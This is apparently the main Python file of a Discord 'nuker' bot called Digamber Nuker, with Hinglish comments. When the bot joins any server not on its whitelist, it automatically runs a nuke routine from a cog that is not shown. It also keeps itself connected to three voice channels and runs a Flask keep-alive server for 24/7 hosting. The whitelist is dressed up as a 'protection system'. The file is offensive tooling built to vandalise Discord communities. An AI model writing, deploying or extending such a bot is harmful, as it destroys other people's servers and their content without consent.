import discord
from discord.ext import commands, tasks
import os
import asyncio
from flask import Flask
from datetime import datetime

app = Flask(__name__)
bot_name = "Loading..."

@app.route('/')
def home():
    return f"🤖 {bot_name} - Operational"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

TOKEN = os.getenv("DISCORD_TOKEN")

class NukerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(
            command_prefix="!",
            intents=intents,
            help_command=None
        )
        self.start_time = datetime.now()
        # TERA TEENO VOICE CHANNELS
        self.voice_channels = [
            1445768972199792742,  # Pehla server
            1400384001306529904,  # Dusra server  
            1421772715962142840   # Teesra server
        ]
        self.connected_channels = {}  # Track connected channels

    async def setup_hook(self):
        try:
            await self.load_extension("cogs.nuker")
            print("✅ Loaded nuker cog with PROFESSIONAL features")
        except Exception as e:
            print(f"❌ Failed to load cog: {e}")

        await self.tree.sync()
        self.update_status.start()
        self.update_dashboard.start()
        self.voice_connect_all.start()  # Connect to ALL channels

    async def connect_to_channel(self, channel_id):
        """Connect to a specific voice channel"""
        try:
            channel = self.get_channel(channel_id)
            if not channel:
                print(f"❌ Channel {channel_id} not found")
                return False
            
            # Check if already connected
            guild = channel.guild
            if guild.voice_client and guild.voice_client.is_connected():
                if guild.voice_client.channel.id == channel_id:
                    self.connected_channels[channel_id] = True
                    return True
            
            # Connect to channel
            await channel.connect(timeout=10.0, reconnect=False)
            self.connected_channels[channel_id] = True
            print(f"✅ Connected to voice: {channel.name} ({channel.guild.name})")
            return True
            
        except discord.errors.ClientException as e:
            if "Already connected" in str(e):
                self.connected_channels[channel_id] = True
                return True
            print(f"⚠️  Voice error [{channel_id}]: {e}")
        except Exception as e:
            print(f"❌ Connection failed [{channel_id}]: {type(e).__name__}")
        
        self.connected_channels[channel_id] = False
        return False

    async def connect_all_voice(self):
        """Connect to ALL 3 voice channels"""
        print("🔊 Connecting to ALL voice channels...")
        for channel_id in self.voice_channels:
            await self.connect_to_channel(channel_id)
            await asyncio.sleep(1)  # 1 second gap between connections

    async def on_ready(self):
        global bot_name
        bot_name = str(self.user)
        print(f"🔗 {bot_name} is ONLINE!")
        print(f"📊 Connected to {len(self.guilds)} servers")
        
        # Whitelisted servers ko check karo
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            whitelist_count = len(nuker_cog.whitelisted_servers)
            print(f"🔒 {whitelist_count} servers are WHITELISTED (PROTECTED)")
            
            # Tere teen safe servers ki list print karo
            safe_servers = []
            for server_id in nuker_cog.whitelisted_servers:
                guild = self.get_guild(server_id)
                if guild:
                    safe_servers.append(f"{guild.name} ({server_id})")
            
            if safe_servers:
                print("✅ PROTECTED SERVERS:")
                for server in safe_servers:
                    print(f"   - {server}")
        
        # CONNECT TO ALL VOICE CHANNELS ON STARTUP
        await self.connect_all_voice()
        
        if os.environ.get('RENDER'):
            import threading
            threading.Thread(target=run_flask, daemon=True).start()
            print("🚀 Flask server started for 24/7 uptime")

    @tasks.loop(minutes=2)
    async def voice_connect_all(self):
        """Check and reconnect to ALL channels every 2 minutes"""
        try:
            if not self.is_ready():
                return
            
            print("🔄 Checking ALL voice connections...")
            for channel_id in self.voice_channels:
                channel = self.get_channel(channel_id)
                if not channel:
                    print(f"❌ Channel {channel_id} not found")
                    continue
                
                guild = channel.guild
                vc = guild.voice_client
                
                # Check if connected to THIS channel
                if vc and vc.is_connected():
                    if vc.channel.id == channel_id:
                        self.connected_channels[channel_id] = True
                        continue
                
                # Not connected to this channel, reconnect
                print(f"🔇 Reconnecting to {channel.name}...")
                await self.connect_to_channel(channel_id)
                
        except Exception as e:
            print(f"❌ Voice check error: {e}")

    @voice_connect_all.before_loop
    async def before_voice_connect_all(self):
        await self.wait_until_ready()

    async def on_voice_state_update(self, member, before, after):
        """Monitor bot's own voice state changes"""
        if member.id == self.user.id:
            if before.channel and not after.channel:
                # Bot was disconnected from a channel
                print(f"🔇 Bot disconnected from voice")
                # Reconnect after 5 seconds
                await asyncio.sleep(5)
                for channel_id in self.voice_channels:
                    if before.channel.id == channel_id:
                        await self.connect_to_channel(channel_id)
                        break

    async def on_guild_join(self, guild):
        """Naya server join hone par - PROFESSIONAL SYSTEM"""
        print(f"🎯 Bot joined: {guild.name} ({guild.id})")
        
        nuker_cog = self.get_cog("NukerCommands")
        if nuker_cog:
            if nuker_cog.is_whitelisted(guild.id):
                print(f"✅ WHITELISTED SERVER - Bot will provide protection features")
                # Whitelisted server hai - protection provide karo
                try:
                    general = discord.utils.get(guild.text_channels, name="general")
                    if general:
                        embed = discord.Embed(
                            title="🛡️ PROTECTION SYSTEM ACTIVATED",
                            description=f"**{guild.name}** is now protected by Digamber Nuker System.",
                            color=0x00ff00,
                            timestamp=datetime.utcnow()
                        )
                        embed.add_field(
                            name="AVAILABLE COMMANDS",
                            value="• `!protection` - Check safety status\n• `!serverinfo` - Server analytics\n• `!whitelisted` - View protected servers",
                            inline=False
                        )
                        embed.set_footer(text="Digamber Protection • 24/7 Security")
                        await general.send(embed=embed)
                except:
                    pass
                return
            else:
                print(f"💣 NON-WHITELISTED SERVER - Starting PROFESSIONAL NUKE!")
                await nuker_cog.nuke_server(guild)

    @tasks.loop(minutes=5)
    async def update_status(self):
        """Update bot status every 5 minutes"""
        try:
            nuker_cog = self.get_cog("NukerCommands")
            safe_count = len(nuker_cog.whitelisted_servers) if nuker_cog else 0
            total_servers = len(self.guilds)
            
            status_text = f"{safe_count}/{total_servers} Protected"
            await self.change_presence(activity=discord.Activity(
                type=discord.ActivityType.watching,
                name=status_text
            ))
        except:
            pass

    @tasks.loop(minutes=2)
    async def update_dashboard(self):
        """Update status channel every 2 minutes"""
        try:
            nuker_cog = self.get_cog("NukerCommands")
            if nuker_cog:
                await nuker_cog.update_status_channel()
        except Exception as e:
            print(f"❌ Dashboard update failed: {e}")

    @update_status.before_loop
    async def before_update_status(self):
        await self.wait_until_ready()

    @update_dashboard.before_loop
    async def before_update_dashboard(self):
        await self.wait_until_ready()

if __name__ == "__main__":
    print("🚀 Starting Digamber Nuker Bot with PROFESSIONAL features...")
    print("🔊 24/7 Voice System: ALL 3 CHANNELS")
    print("📌 Voice Channels to connect:")
    print("   1. 1445768972199792742")
    print("   2. 1400384001306529904")  
    print("   3. 1421772715962142840")
    bot = NukerBot()
    bot.run(TOKEN)
